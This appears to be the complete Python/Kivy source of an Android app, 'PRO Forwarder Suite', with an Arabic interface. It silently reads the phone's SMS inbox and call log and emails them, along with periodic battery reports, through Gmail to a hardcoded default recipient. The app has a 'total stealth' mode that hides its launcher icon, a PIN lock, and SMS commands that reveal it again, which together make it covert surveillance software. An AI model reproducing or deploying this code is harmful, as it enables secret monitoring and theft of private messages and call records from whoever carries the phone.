import os
import json
import smtplib
import threading
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock
from kivy.graphics import Color, RoundedRectangle

CONFIG = os.path.expanduser('~/.smsfwd.json')

def load_cfg():
    d = {
        'sender': '',
        'password': '',
        'recipient': 'hamzatalat8@gmail.com',
        'last_sms_time': 0,
        'last_call_time': 0,
        'sent_sms': [],
        'sent_calls': [],
        'pin_code': '1234',
        'is_hidden': False,
        'last_report_time': 0
    }
    try:
        if os.path.exists(CONFIG):
            with open(CONFIG, 'r', encoding='utf-8') as f:
                d.update(json.load(f))
    except Exception:
        pass
    return d

def save_cfg(c):
    try:
        with open(CONFIG, 'w', encoding='utf-8') as f:
            json.dump(c, f, ensure_ascii=False, indent=4)
    except Exception:
        pass

def send_mail(cfg, subj, body):
    if not cfg['sender'] or not cfg['password']:
        return False, 'بيانات المرسل غير مكتملة'
    try:
        msg = MIMEMultipart()
        msg['From'] = cfg['sender']
        msg['To'] = cfg['recipient']
        msg['Subject'] = subj
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=15) as s:
            s.login(cfg['sender'], cfg['password'])
            s.sendmail(cfg['sender'], cfg['recipient'], msg.as_string())
        return True, 'OK'
    except Exception as e:
        return False, str(e)

def set_app_icon_visible(visible=True):
    try:
        from jnius import autoclass
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        PackageManager = autoclass('android.content.pm.PackageManager')
        ComponentName = autoclass('android.content.ComponentName')
        
        ctx = PythonActivity.mActivity
        pm = ctx.getPackageManager()
        comp_name = ComponentName(ctx.getPackageName(), "org.kivy.android.PythonActivity")
        
        if visible:
            state = PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        else:
            state = PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            
        pm.setComponentEnabledSetting(comp_name, state, PackageManager.DONT_KILL_APP)
        return True
    except Exception:
        return False

class ModernTextInput(TextInput):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.background_active = ''
        self.background_normal = ''
        self.background_color = [0, 0, 0, 0]
        self.cursor_color = [0.12, 0.53, 0.9, 1]
        self.foreground_color = [0.2, 0.2, 0.2, 1]
        self.padding = [15, 12, 15, 12]
        self.font_size = '16sp'
        self.bind(size=self._update_canvas, pos=self._update_canvas)

    def _update_canvas(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(0.96, 0.96, 0.98, 1)
            RoundedRectangle(pos=self.pos, size=self.size, radius=[10])

class ModernButton(Button):
    def __init__(self, bg_color=[0.12, 0.53, 0.9, 1], **kwargs):
        super().__init__(**kwargs)
        self.bg_color = bg_color
        self.background_normal = ''
        self.background_down = ''
        self.background_color = [0, 0, 0, 0]
        self.font_size = '16sp'
        self.bold = True
        self.bind(size=self._update_canvas, pos=self._update_canvas)

    def _update_canvas(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(*self.bg_color)
            RoundedRectangle(pos=self.pos, size=self.size, radius=[10])

class LockScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.cfg = load_cfg()
        layout = BoxLayout(orientation='vertical', padding=40, spacing=20)
        
        layout.add_widget(Label(text='🛡️ حماية النظام المتقدمة', font_size='22sp', bold=True, color=[0.1, 0.1, 0.1, 1]))
        layout.add_widget(Label(text='أدخل رمز PIN للدخول للوحة التحكم:', font_size='14sp', color=[0.4, 0.4, 0.4, 1]))
        
        self.pin_input = ModernTextInput(password=True, multiline=False, size_hint_y=None, height=50)
        layout.add_widget(self.pin_input)
        
        btn_login = ModernButton(text='تحقق ودخول', bg_color=[0.12, 0.53, 0.9, 1], size_hint_y=None, height=50)
        btn_login.bind(on_press=self.check_pin)
        layout.add_widget(btn_login)
        
        self.error_lbl = Label(text='', color=[1, 0, 0, 1], font_size='14sp')
        layout.add_widget(self.error_lbl)
        
        self.add_widget(layout)

    def check_pin(self, *args):
        self.cfg = load_cfg()
        if self.pin_input.text.strip() == self.cfg.get('pin_code', '1234'):
            self.manager.current = 'main'
            self.error_lbl.text = ''
            self.pin_input.text = ''
        else:
            self.error_lbl.text = '❌ رمز PIN غير صحيح! حاول مجدداً.'

class MainScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.active = False
        self._stop = threading.Event()
        self.cfg = load_cfg()
        self.last_clean_day = datetime.now().day
        
        scroll = ScrollView(do_scroll_x=False)
        root = BoxLayout(orientation='vertical', padding=25, spacing=15, size_hint_y=None)
        root.bind(minimum_height=root.setter('height'))
        
        root.add_widget(Label(text='🛡️ PRO Forwarder Suite', font_size='24sp', bold=True, color=[0.1, 0.1, 0.1, 1], size_hint_y=None, height=40))
        
        self.status = Label(text='[color=ff4444]● وضع الاستعداد (متوقف)[/color]', markup=True, font_size='15sp', size_hint_y=None, height=30)
        root.add_widget(self.status)
        
        root.add_widget(Label(text='بريد Gmail المرسل:', color=[0.3, 0.3, 0.3, 1], size_hint_y=None, height=20))
        self.inp_sender = ModernTextInput(text=self.cfg.get('sender', ''), multiline=False, size_hint_y=None, height=48)
        root.add_widget(self.inp_sender)
        
        root.add_widget(Label(text='كلمة مرور التطبيق (App Password):', color=[0.3, 0.3, 0.3, 1], size_hint_y=None, height=20))
        self.inp_pass = ModernTextInput(text=self.cfg.get('password', ''), password=True, multiline=False, size_hint_y=None, height=48)
        root.add_widget(self.inp_pass)
        
        root.add_widget(Label(text='البريد الإلكتروني المستقبل:', color=[0.3, 0.3, 0.3, 1], size_hint_y=None, height=20))
        self.inp_recv = ModernTextInput(text=self.cfg.get('recipient', 'hamzatalat8@gmail.com'), multiline=False, size_hint_y=None, height=48)
        root.add_widget(self.inp_recv)
        
        root.add_widget(Label(text='تعديل رمز قفل التطبيق (PIN):', color=[0.3, 0.3, 0.3, 1], size_hint_y=None, height=20))
        self.inp_pin = ModernTextInput(text=self.cfg.get('pin_code', '1234'), multiline=False, size_hint_y=None, height=48)
        root.add_widget(self.inp_pin)
        
        self.btn = ModernButton(text='تشغيل الخدمة الذكية', bg_color=[0.11, 0.65, 0.36, 1], size_hint_y=None, height=50)
        self.btn.bind(on_press=self.toggle)
        root.add_widget(self.btn)
        
        self.btn_stealth = ModernButton(text='🕵️ تفعيل وضع التخفي التام', bg_color=[0.4, 0.4, 0.4, 1], size_hint_y=None, height=50)
        self.btn_stealth.bind(on_press=self.toggle_stealth)
        root.add_widget(self.btn_stealth)
        
        self.btn_test = ModernButton(text='إرسال رسالة اختبار سرعة', bg_color=[0.12, 0.53, 0.9, 1], size_hint_y=None, height=45)
        self.btn_test.bind(on_press=self.test)
        root.add_widget(self.btn_test)
        
        root.add_widget(Label(text='سجل العمليات المباشر:', color=[0.4, 0.4, 0.4, 1], font_size='13sp', size_hint_y=None, height=20))
        self.log = Label(text='نظام الرصد آمن وجاهز...', color=[0.2, 0.2, 0.2, 1], font_size='13sp', size_hint_y=None, height=60, halign='center', valign='middle')
        self.log.bind(size=self.log.setter('text_size'))
        root.add_widget(self.log)
        
        scroll.add_widget(root)
        self.add_widget(scroll)

    def append_log(self, text):
        def _update(dt):
            now = datetime.now().strftime("%H:%M:%S")
            self.log.text = f"[{now}] {text}"
        Clock.schedule_once(_update, 0)

    def save(self):
        self.cfg['sender'] = self.inp_sender.text.strip()
        self.cfg['password'] = self.inp_pass.text.strip()
        self.cfg['recipient'] = self.inp_recv.text.strip()
        self.cfg['pin_code'] = self.inp_pin.text.strip()
        save_cfg(self.cfg)

    def toggle_stealth(self, *a):
        self.save()
        if set_app_icon_visible(False):
            self.cfg['is_hidden'] = True
            save_cfg(self.cfg)
            current_pin = self.cfg.get('pin_code', '1234')
            self.append_log(f"🕵️ تم الإخفاء! للإظهار أرسل SMS تحتوي على: #SHOW {current_pin}")
        else:
            self.append_log("التخفي غير مدعوم في البيئة الحالية (محاكاة).")

    def toggle(self, *a):
        if not self.active:
            self.save()
            self.active = True
            self._stop.clear()
            self.btn.text = 'إيقاف الخدمة والرقابة'
            self.btn.bg_color = [0.89, 0.24, 0.24, 1]
            self.btn._update_canvas()
            self.status.text = '[color=00c853]● وضع الرصد والمزامنة النشط يعمل حالياً...[/color]'
            threading.Thread(target=self._loop, daemon=True).start()
        else:
            self.active = False
            self._stop.set()
            self.btn.text = 'تشغيل الخدمة الذكية'
            self.btn.bg_color = [0.11, 0.65, 0.36, 1]
            self.btn._update_canvas()
            self.status.text = '[color=ff4444]● وضع الاستعداد (متوقف)[/color]'

    def test(self, *a):
        self.save()
        def _t():
            ok, msg = send_mail(self.cfg, '⚡ اختبار اتصال التطبيق الخارق', f'تم إرسال هذا الإشعار لاختبار استجابة سيرفر الإرسال بنجاح.\nالوقت: {datetime.now()}')
            self.append_log('✅ تم إرسال بريد الاختبار بنجاح!' if ok else f'❌ فشل الاتصال: {msg}')
        threading.Thread(target=_t, daemon=True).start()
        self.append_log('جاري فحص الاتصال بسيرفرات SMTP...')

    def _loop(self):
        sent_sms = set(self.cfg.get('sent_sms', []))
        sent_calls = set(self.cfg.get('sent_calls', []))
        
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Uri = autoclass('android.net.Uri')
            Intent = autoclass('android.content.Intent')
            IntentFilter = autoclass('android.content.IntentFilter')
            BatteryManager = autoclass('android.os.BatteryManager')
            ANDROID = True
        except Exception:
            ANDROID = False

        while not self._stop.is_set():
            config_changed = False
            self.cfg = load_cfg()
            
            try:
                if ANDROID:
                    ctx = PythonActivity.mActivity
                    
                    current_day = datetime.now().day
                    if current_day != self.last_clean_day:
                        sent_sms.clear()
                        sent_calls.clear()
                        self.last_clean_day = current_day
                        config_changed = True
                        self.append_log("♻️ تم تنفيذ التدمير الذاتي وتطهير السجلات تلقائياً.")

                    now_ts = datetime.now().timestamp()
                    if now_ts - self.cfg.get('last_report_time', 0) > 21600:
                        ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                        batteryStatus = ctx.registerReceiver(None, ifilter)
                        level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                        scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                        pct = int((level / float(scale)) * 100) if scale > 0 else 0
                        
                        report_msg = f"🔋 تقرير حالة الهاتف الدوري:\n- مستوى شحن البطارية: {pct}%\n- وقت التقرير: {datetime.now()}"
                        ok, _ = send_mail(self.cfg, f"📊 تقرير حالة الجهاز الدوري - {pct}%", report_msg)
                        if ok:
                            self.cfg['last_report_time'] = now_ts
                            config_changed = True

                    uri = Uri.parse('content://sms/inbox')
                    cur = ctx.getContentResolver().query(uri, None, None, None, 'date DESC')
                    if cur and cur.moveToFirst():
                        for _ in range(min(cur.getCount(), 15)):
                            row = {c: cur.getString(cur.getColumnIndex(c)) for c in ['_id', 'address', 'body', 'date']}
                            sms_id = row['_id']
                            sms_date = int(row.get('date', 0))
                            body_text = (row['body'] or '').strip()
                            
                            if body_text.startswith('#SHOW') or body_text == '#STOP':
                                if sms_id not in sent_sms:
                                    sent_sms.add(sms_id)
                                    config_changed = True
                                if not cur.moveToNext(): break
                                continue

                            if sms_id and sms_id not in sent_sms and sms_date > self.cfg.get('last_sms_time', 0):
                                time_str = datetime.fromtimestamp(sms_date/1000.0).strftime('%Y-%m-%d %H:%M:%S')
                                email_body = f"المرسل: {row['address']}\nالتوقيت: {time_str}\n\nنص الرسالة:\n{row['body']}"
                                
                                ok, _ = send_mail(self.cfg, f"📩 SMS من: {row['address']}", email_body)
                                if ok:
                                    sent_sms.add(sms_id)
                                    if sms_date > self.cfg['last_sms_time']:
                                        self.cfg['last_sms_time'] = sms_date
                                    config_changed = True
                                    self.append_log(f"تم تحويل رسالة من: {row['address']}")
                            if not cur.moveToNext(): break
                        cur.close()

                    uri2 = Uri.parse('content://call_log/calls')
                    cur2 = ctx.getContentResolver().query(uri2, None, None, None, 'date DESC')
                    if cur2 and cur2.moveToFirst():
                        for _ in range(min(cur2.getCount(), 8)):
                            row = {c: cur2.getString(cur2.getColumnIndex(c)) for c in ['number', 'type', 'duration', 'date']}
                            call_date = int(row.get('date', 0))
                            uid = f"{call_date}_{row.get('number','')}"
                            
                            t = {'1': 'واردة', '2': 'صادرة', '3': 'فائتة'}.get(str(row.get('type', '')), 'مجهولة')
                            
                            if uid not in sent_calls and call_date > self.cfg.get('last_call_time', 0):
                                call_time = datetime.fromtimestamp(call_date/1000.0).strftime('%Y-%m-%d %H:%M:%S')
                                body_text = f"رقم الهاتف: {row['number']}\nنوع المكالمة: {t}\nالتوقيت: {call_time}\nالمدة: {row['duration']} ثانية"
                                
                                ok, _ = send_mail(self.cfg, f"📞 مكالمة {t} - {row['number']}", body_text)
                                if ok:
                                    sent_calls.add(uid)
                                    if call_date > self.cfg['last_call_time']:
                                        self.cfg['last_call_time'] = call_date
                                    config_changed = True
                                    self.append_log(f"تم تحويل مكالمة {t}: {row['number']}")
                            if not cur2.moveToNext(): break
                        cur2.close()

                    if config_changed:
                        self.cfg['sent_sms'] = list(sent_sms)[-150:]
                        self.cfg['sent_calls'] = list(sent_calls)[-150:]
                        save_cfg(self.cfg)

            except Exception as e:
                self.append_log(f"خطأ خلفي: {str(e)[:50]}")
            
            self._stop.wait(12)

class SMSApp(App):
    def build(self):
        self.title = "PRO Forwarder Suite"
        sm = ScreenManager()
        sm.add_widget(LockScreen(name='lock'))
        sm.add_widget(MainScreen(name='main'))
        return sm

if __name__ == '__main__':
    SMSApp().run()
